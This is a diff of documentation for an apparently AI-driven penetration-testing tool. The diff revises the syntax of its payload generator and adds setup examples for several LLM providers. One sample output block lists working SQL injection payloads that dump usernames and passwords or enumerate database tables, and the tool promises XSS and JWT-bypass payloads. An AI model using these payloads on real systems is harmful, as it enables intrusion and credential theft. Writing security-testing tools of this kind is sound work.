@@ -124,20 +124,26 @@ Enables neural engine:
 
 Generates AI payloads:
 
+**Syntax:** `neuro-gen <context> [count]`
+
 ```bash
-> neuro-gen --endpoint /api/search --param q --type string
+> neuro-gen "SQL injection on /api/search parameter" 10
 
 [cyan]PAYLOAD_GEN:[-] Requesting AI payloads...
 [blue]LLM:[-] Generating 10 unique SQL injection payloads...
-[yellow]PAYLOAD 1:[-] q=1' UNION SELECT NULL,username,password FROM users--
-[yellow]PAYLOAD 2:[-] q=1' AND 1=1 UNION ALL SELECT 1,2,3,4,5--
-[yellow]PAYLOAD 3:[-] q=1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--
-[yellow]PAYLOAD 4:[-] q=1' /*!50000UNION*/ /*!50000SELECT*/ username FROM users--
-[yellow]PAYLOAD 5:[-] q=1' OR '1'='1
+[yellow]PAYLOAD 1:[-] 1' UNION SELECT NULL,username,password FROM users--
+[yellow]PAYLOAD 2:[-] 1' AND 1=1 UNION ALL SELECT 1,2,3,4,5--
+[yellow]PAYLOAD 3:[-] 1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--
+[yellow]PAYLOAD 4:[-] 1' /*!50000UNION*/ /*!50000SELECT*/ username FROM users--
+[yellow]PAYLOAD 5:[-] 1' OR '1'='1
 ...
 [cyan]PAYLOADS:[-] Generated 10 payloads. Testing now...
 [green]✓ SUCCESS:[-] Payload 1 confirmed SQL injection!
 ```
+
+**Parameters:**
+- `context` - Description of what to generate (e.g., "XSS in user profile", "JWT bypass")
+- `count` - (Optional) Number of payloads to generate (default: 10)
 
 ### Command: `test-neuro`
 
@@ -191,11 +197,13 @@ Would you like me to generate JWT manipulation payloads?"
 
 ### Setup API Key
 
+**Syntax:** `neuro config <provider> <model> [api_key] [endpoint]`
+
 #### For Groq (Recommended - Free):
 
 ```bash
 # Get API key from https://console.groq.com
-> neuro config --provider groq --apikey gsk_xxxxx
+> neuro config groq llama-3.1-8b gsk_xxxxx
 
 [green]✓ CONFIG:[-] Groq API key configured
 [cyan]TIER:[-] Free tier (5,000 tokens/min)
@@ -204,7 +212,7 @@ Would you like me to generate JWT manipulation payloads?"
 #### For OpenAI:
 
 ```bash
-> neuro config --provider openai --apikey sk-xxxxx
+> neuro config openai gpt-4o sk_proj_xxxxx
 
 [green]✓ CONFIG:[-] OpenAI API key configured
 [cyan]TIER:[-] $0.03 per 1K tokens (GPT-4)
@@ -213,19 +221,29 @@ Would you like me to generate JWT manipulation payloads?"
 #### For Local (Ollama):
 
 ```bash
-> neuro config --provider local --endpoint http://localhost:11434
+> neuro config ollama mistral
 
 [green]✓ CONFIG:[-] Local LLM configured (Ollama)
-[cyan]MODEL:[-] Using llama2:70b (no API costs)
+[cyan]MODEL:[-] Using mistral (no API costs)
 ```
 
-### Advanced Configuration
+#### For Google Gemini:
 
 ```bash
-neuro config --temperature 0.7      # Randomness (0-1)
-neuro config --max-tokens 1000      # Response length
-neuro config --timeout 30           # API timeout
-neuro config --cache on             # Cache responses
+> neuro config google gemini-1.5-flash AIza_xxxxx
+
+[green]✓ CONFIG:[-] Google Gemini configured
+[cyan]MODEL:[-] Using gemini-1.5-flash
+```
+
+#### For Hybrid Mode (Cloud + Local Fallback):
+
+```bash
+> neuro config hybrid gpt-4o sk_proj_xxxxx
+
+[magenta]✓ CONFIG:[-] Hybrid mode configured
+[cyan]PRIMARY:[-] OpenAI GPT-4o
+[cyan]FALLBACK:[-] Local Ollama
 ```
 
 ---
